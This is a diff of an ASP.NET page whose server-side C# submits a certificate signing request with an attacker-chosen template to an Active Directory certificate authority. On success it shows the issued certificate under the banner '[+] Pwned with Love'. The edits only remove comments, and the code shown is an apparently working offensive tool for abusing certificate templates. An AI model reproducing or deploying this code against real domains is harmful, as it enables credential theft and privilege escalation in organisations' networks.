@@ -105,7 +105,7 @@ A:active {
        </td></tr></table>
 </div><br><div align=center>
     <script runat="server">
-        protected bool showForm = true; // Flag to control form display
+        protected bool showForm = true; 
 
         protected void Page_Load(object sender, EventArgs e)
         {
@@ -123,15 +123,11 @@ A:active {
                         Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request");
                         dynamic certRequest = Activator.CreateInstance(certRequestType);
 
-                        // Format the request attributes (Template Name)
                         string requestAttributes = "CertificateTemplate:" + templateName;
 
-                        // Submit the CSR to the CA with Template Name
                         int result = certRequest.Submit(1, csr, requestAttributes, caServer);
 
-                        // Handle the response
-                     // Handle the response
-                            if (result == 3)  // 3 = Issued
+                         if (result == 3)  // 3 = Issued
                             {
                                 certResponse = "<h3 style='color:red;'> [+] Pwned with Love </br> [+] Enjoy the party....<br></h3>";
                                 certResponse += "<textarea rows='10' cols='80'>" + Server.HtmlEncode(certRequest.GetCertificate(1)) + "</textarea>";
@@ -147,7 +143,7 @@ A:active {
                                 certResponse += "<p>Error: " + Server.HtmlEncode(certRequest.GetDispositionMessage()) + "</p>";
                             }
 
-                        showForm = false; // Hide the form after processing
+                        showForm = false; 
                     }
                     catch (Exception ex)
                     {
@@ -179,4 +175,3 @@ A:active {
 
 </body>
 </html>
-
